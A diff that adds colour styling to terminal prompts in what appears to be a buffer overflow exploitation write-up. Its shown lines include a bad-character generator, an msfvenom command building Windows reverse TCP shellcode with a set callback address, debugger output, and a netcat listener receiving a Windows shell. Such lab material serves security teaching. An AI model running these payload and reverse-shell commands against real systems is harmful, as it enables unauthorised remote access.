@@ -369,7 +369,7 @@ pip3 install badchars
 
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@kali:/home/kali# badchars -f python
+<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>/home/kali</b></span># badchars -f python
 badchars = (
   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
   "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -1761,7 +1761,7 @@ The following reverse TCP shellcode will be used in order to exploit the buffer 
 From **msfvenom** we generate the reverse TCP shellcode :
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread  -b "\x00" -f  python
+<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~</b></span># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread  -b "\x00" -f  python
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 11 compatible encoders
@@ -2107,7 +2107,7 @@ cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d718 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
-0022d718 dbdc fcmovnu st,st(4)
+0022d718 <span style="color:#ff0000;">dbdc </span>fcmovnu st,st(4)
 [..snip..]
 </pre>
 
@@ -2132,7 +2132,7 @@ nv -nlvp 443
 After running the script we will have our shell&nbsp;
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@kali:~# nc -nlvp 443
+<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~</b></span># nc -nlvp 443
 listening on [any] 443 ...
 connect to [192.168.201.7] from (UNKNOWN) [192.168.201.88] 49900
 Microsoft Windows [Version 6.1.7601]
